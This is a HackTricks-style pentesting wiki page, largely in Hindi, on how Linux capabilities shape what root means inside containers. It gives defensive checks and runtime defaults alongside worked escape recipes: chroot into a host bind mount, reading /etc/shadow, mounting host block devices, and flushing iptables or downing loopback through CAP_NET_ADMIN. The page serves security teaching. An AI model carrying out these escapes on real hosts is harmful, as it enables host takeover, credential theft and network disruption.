# Linux क्षमताएँ कंटेनरों में

{{#include ../../../../banners/hacktricks-training.md}}

## अवलोकन

Linux capabilities कंटेनर सुरक्षा के सबसे महत्वपूर्ण हिस्सों में से एक हैं क्योंकि ये एक सूक्ष्म लेकिन मौलिक प्रश्न का उत्तर देती हैं: **कंटेनर के अंदर "root" का असल मतलब क्या है?** सामान्य Linux सिस्टम पर, UID 0 ऐतिहासिक रूप से एक बहुत व्यापक privilege सेट दर्शाता था। आधुनिक कर्नेल में, उस privilege को capabilities नामक छोटे-छोटे यूनिट्स में विभाजित किया गया है। कोई प्रक्रिया root के रूप में चल सकती है और फिर भी कई शक्तिशाली ऑपरेशनों से वंचित हो सकती है अगर संबंधित capabilities हटा दी गई हों।

Containers इस भेद पर काफी निर्भर करते हैं। कई workloads अभी भी compatibility या simplicity कारणों से container के अंदर UID 0 के रूप में लॉन्च होते हैं। capability dropping के बिना, यह बहुत ज़्यादा खतरनाक होता। capability dropping के साथ, एक containerized root प्रक्रिया अभी भी कई सामान्य इन-कंटेनर कार्य कर सकती है जबकि अधिक संवेदनशील kernel ऑपरेशनों से रोकी जा सकती है। इसलिए एक container shell जो कहता है `uid=0(root)` स्वचालित रूप से "host root" या यहाँ तक कि "बड़े kernel privileges" का मतलब नहीं होता। capability सेट तय करते हैं कि उस root पहचान की वास्तविक कद्र कितनी है।

For the full Linux capability reference and many abuse examples, see:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## ऑपरेशन

Capabilities कई सेटों में ट्रैक की जाती हैं, जिनमें permitted, effective, inheritable, ambient, और bounding सेट शामिल हैं। कई container आकलनों के लिए, प्रत्येक सेट का सटीक कर्नेल semantics तुरंत उतना महत्वपूर्ण नहीं होता जितना कि अंतिम व्यावहारिक प्रश्न: **यह प्रक्रिया अभी कौन-कौन से privileged ऑपरेशन्स सफलतापूर्वक कर सकती है, और भविष्य में कौन-कौन से privilege प्राप्त करना संभव है?**

यह इसलिए महत्वपूर्ण है क्योंकि कई breakout techniques वास्तव में capabilities की समस्या होती हैं जो container समस्याओं के रूप में छिपी होती हैं। `CAP_SYS_ADMIN` वाले workload के पास कर्नेल की बहुत सारी ऐसी कार्यक्षमताएँ पहुँच में आ जाती हैं जिनसे एक सामान्य container root प्रक्रिया को छेड़छाड़ नहीं करनी चाहिए। अगर workload के पास `CAP_NET_ADMIN` है और वह host network namespace भी शेयर करता है तो वह बहुत अधिक खतरनाक हो जाता है। अगर workload के पास `CAP_SYS_PTRACE` है और वह host PID sharing के माध्यम से host प्रक्रियाओं को देख सकता है तो वह और भी रोचक बन जाता है। Docker या Podman में यह अक्सर `--pid=host` के रूप में दिखाई देता है; Kubernetes में यह आमतौर पर `hostPID: true` के रूप में दिखाई देता है।

दूसरे शब्दों में, capability सेट को अलग करके मूल्यांकित नहीं किया जा सकता। इसे namespaces, seccomp, और MAC policy के साथ मिलकर पढ़ा जाना चाहिए।

## लैब

कंटेनर के अंदर capabilities की जाँच करने का एक बहुत ही सीधा तरीका है:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
आप एक अधिक प्रतिबंधित container की तुलना ऐसे container से भी कर सकते हैं जिसमें सभी capabilities जोड़ी गई हों:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
एक narrow addition का प्रभाव देखने के लिए, सभी चीज़ें हटा कर केवल एक capability ही वापस जोड़ें:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
These small experiments help show that a runtime is not simply toggling a boolean called "privileged". It is shaping the actual privilege surface available to the process.

## उच्च-जोखिम क्षमताएँ

हालाँकि कई capabilities लक्ष्यों के अनुसार मायने रख सकती हैं, कुछ बार-बार container escape analysis में प्रासंगिक रहती हैं।

**`CAP_SYS_ADMIN`** वह capability है जिसे defenders को सबसे ज़्यादा संदेह के साथ देखना चाहिए। इसे अक्सर "the new root" कहा जाता है क्योंकि यह बहुत सारी functionality अनलॉक कर देता है, जिसमें mount-related operations, namespace-sensitive behavior, और कई kernel paths शामिल हैं जिन्हें containers को casually एक्सपोज़ नहीं किया जाना चाहिए। अगर किसी container के पास `CAP_SYS_ADMIN`, कमजोर seccomp, और कोई मजबूत MAC confinement नहीं है, तो कई क्लासिक breakout paths बहुत अधिक realistic हो जाते हैं।

**`CAP_SYS_PTRACE`** तब मायने रखता है जब process visibility मौजूद हो, खासकर अगर PID namespace host के साथ या आस-पास के रोचक workloads के साथ shared हो। यह visibility को tampering में बदल सकता है।

**`CAP_NET_ADMIN`** और **`CAP_NET_RAW`** network-focused environments में मायने रखते हैं। एक isolated bridge network पर वे पहले से ही risky हो सकते हैं; एक shared host network namespace पर वे कहीं अधिक ख़तरनाक होते हैं क्योंकि workload host networking को reconfigure कर सकता है, sniff, spoof, या स्थानीय traffic flows में हस्तक्षेप कर सकता है।

**`CAP_SYS_MODULE`** आमतौर पर rootful environment में catastrophic होता है क्योंकि kernel modules लोड करना प्रभावी रूप से host-kernel नियंत्रण है। इसे लगभग कभी भी किसी general-purpose container workload में नहीं होना चाहिए।

## Runtime उपयोग

Docker, Podman, containerd-based stacks, और CRI-O सभी capability controls का उपयोग करते हैं, लेकिन defaults और management interfaces अलग हैं। Docker इन्हें बहुत सीधे flags जैसे `--cap-drop` और `--cap-add` के माध्यम से एक्सपोज़ करता है। Podman समान controls एक्सपोज़ करता है और अक्सर अतिरिक्त सुरक्षा परत के रूप में rootless execution से लाभ उठाता है। Kubernetes capability additions और drops को Pod या container के `securityContext` के माध्यम से surface करता है। System-container environments जैसे LXC/Incus भी capability control पर निर्भर करते हैं, लेकिन उन प्रणालियों का व्यापक host integration अक्सर operators को defaults को app-container environment की तुलना में ज़्यादा aggressively relax करने के लिए प्रेरित करता है।

इन सभी पर वही सिद्धांत लागू होता है: कोई capability जो तकनीकी रूप से grant की जा सकती है, जरूरी नहीं कि उसे दिया जाना चाहिए। कई वास्तविक दुनिया के incidents तब शुरू होते हैं जब एक operator सिर्फ इसलिए कोई capability जोड़ देता है क्योंकि किसी workload ने stricter configuration में fail कर दिया और टीम को एक quick fix चाहिए होता है।

## मिसकॉन्फ़िगरेशन

सबसे स्पष्ट गलती Docker/Podman-style CLIs में **`--cap-add=ALL`** है, लेकिन यह अकेली गलती नहीं है। व्यवहार में, एक सामान्य समस्या एक या दो बेहद शक्तिशाली capabilities देना है, खासकर `CAP_SYS_ADMIN`, ताकि "make the application work" बिना namespace, seccomp, और mount implications को समझे। एक और सामान्य failure mode extra capabilities को host namespace sharing के साथ जोड़ना है। Docker या Podman में यह `--pid=host`, `--network=host`, या `--userns=host` के रूप में दिख सकता है; Kubernetes में समकक्ष exposure आमतौर पर workload सेटिंग्स जैसे `hostPID: true` या `hostNetwork: true` के माध्यम से दिखाई देता है। इन प्रत्येक संयोजनों से यह बदल जाता है कि capability वास्तव में किस पर प्रभाव डाल सकती है।

यह भी आम है कि administrators यह मान लें कि चूंकि कोई workload पूरी तरह से `--privileged` नहीं है, इसलिए वह अभी भी मायने में सीमित है। कभी-कभी यह सही होता है, लेकिन कभी-कभी प्रभावी स्थिति पहले से ही privileged के काफी करीब होती है कि यह अंतर ऑपरेशनल रूप से मायने नहीं रखता।

## दुरुपयोग

पहला व्यावहारिक कदम effective capability set को enumerate करना और तुरंत capability-specific क्रियाओं का परीक्षण करना है जो escape या host information access के लिए मायने रखती हों:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
यदि `CAP_SYS_ADMIN` मौजूद है, पहले mount-based abuse और host filesystem access का परीक्षण करें, क्योंकि यह सबसे सामान्य breakout enablers में से एक है:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
यदि `CAP_SYS_PTRACE` मौजूद है और container दिलचस्प processes देख सकता है, तो सत्यापित करें कि क्या capability process inspection में बदली जा सकती है:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
यदि `CAP_NET_ADMIN` या `CAP_NET_RAW` मौजूद हैं, तो जांचें कि workload visible network stack को manipulate कर सकता है या कम से कम उपयोगी network intelligence एकत्र कर सकता है:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
जब कोई capability परीक्षण सफल होता है, तो उसे namespace की स्थिति के साथ जोड़कर देखें। एक capability जो अलग किए गए namespace में केवल जोखिम भरी दिखती है, वह तुरंत ही escape या host-recon primitive बन सकती है जब container भी host PID, host network, या host mounts साझा करता हो।

### पूर्ण उदाहरण: `CAP_SYS_ADMIN` + Host Mount = Host Escape

यदि container के पास `CAP_SYS_ADMIN` है और host filesystem का writable bind mount जैसे `/host` मौजूद है, तो escape path अक्सर सीधा होता है:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
यदि `chroot` सफल होता है, तो कमांड अब होस्ट रूट फ़ाइलसिस्टम संदर्भ में निष्पादित होते हैं:
```bash
id
hostname
cat /etc/shadow | head
```
यदि `chroot` उपलब्ध नहीं है, तो अक्सर वही परिणाम mounted tree के माध्यम से binary को कॉल करके प्राप्त किया जा सकता है:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### पूर्ण उदाहरण: `CAP_SYS_ADMIN` + डिवाइस एक्सेस

यदि होस्ट का कोई block device एक्सपोज़ हो गया है, तो `CAP_SYS_ADMIN` उसे सीधे होस्ट फ़ाइलसिस्टम एक्सेस में बदल सकता है:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### पूरा उदाहरण: `CAP_NET_ADMIN` + Host Networking

यह संयोजन हमेशा सीधे host root नहीं देता, लेकिन यह host network stack को पूरी तरह पुनः कॉन्फ़िगर कर सकता है:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
यह denial of service, traffic interception सक्षम कर सकता है, या उन सेवाओं तक पहुँच प्रदान कर सकता है जिन्हें पहले फ़िल्टर किया गया था।

## Checks

capability checks का उद्देश्य केवल dump raw values निकालना नहीं है, बल्कि यह समझना भी है कि क्या process के पास इतना privilege है कि उसकी current namespace और mount स्थिति को खतरनाक बना सके।
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
What is interesting here:

- `capsh --print` is the easiest way to spot high-risk capabilities such as `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, or `cap_sys_module`.
- The `CapEff` line in `/proc/self/status` tells you what is actually effective now, not just what might be available in other sets.
- A capability dump becomes much more important if the container also shares host PID, network, or user namespaces, or has writable host mounts.

Raw capability जानकारी इकट्ठा करने के बाद अगला कदम उसका interpretation करना है। पूछें कि process root है या नहीं, user namespaces active हैं या नहीं, host namespaces shared हैं या नहीं, seccomp enforcing है या नहीं, और क्या AppArmor या SELinux अभी भी process को restrict कर रहे हैं। एक capability set अपने आप में केवल कहानी का एक हिस्सा है, लेकिन अक्सर वही हिस्सा होता है जो समझाता है कि एक container breakout काम क्यों करता है और दूसरे के साथ वही apparent starting point होने पर क्यों fail होता है।

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker capabilities का एक डिफ़ॉल्ट अनुमत-सूची रखता है और बाकी को हटा देता है | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers डिफ़ॉल्ट रूप से unprivileged होते हैं और reduced capability मॉडल का उपयोग करते हैं | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | यदि कोई `securityContext.capabilities` निर्दिष्ट नहीं है, तो container रनटाइम से डिफ़ॉल्ट capabilities सेट प्राप्त करता है | `securityContext.capabilities.add`, `drop: [\"ALL\"]` न करने पर, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | प्रभावी सेट रनटाइम और Pod spec दोनों पर निर्भर करता है | Kubernetes पंक्ति जैसा ही; direct OCI/CRI configuration भी capabilities को स्पष्ट रूप से जोड़ सकती है |

Kubernetes के लिए, महत्वपूर्ण बिंदु यह है कि API एक सार्वभौमिक डिफ़ॉल्ट capabilities सेट परिभाषित नहीं करता। यदि Pod capabilities जोड़ता या हटाता नहीं है, तो workload उस node के runtime डिफ़ॉल्ट को विरासत में लेता है।
{{#include ../../../../banners/hacktricks-training.md}}
